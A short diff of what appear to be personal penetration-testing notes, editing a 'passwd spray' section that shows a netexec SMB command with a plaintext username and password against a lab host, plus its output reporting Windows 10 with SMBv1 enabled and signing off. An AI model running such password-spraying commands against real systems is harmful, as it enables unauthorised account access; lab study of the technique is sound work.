@@ -87,7 +87,7 @@
           right click the connection to view the suggestions.
 
   ### passwd spray
-    /netexec   #pwned means right.
+    /netexec   #pwned means right.    # -u listofname.txt
 
     $ netexec smb 10.0.2.14 -u 'alice' -p 'Bendan1024' -d inmy.com --continue-on-success 
       SMB         10.0.2.14       445    WIN10-3ALICE     [*] Windows 10 Pro 10240 x64 (name:WIN10-3ALICE) (domain:inmy.com) (signing:False) (SMBv1:True)
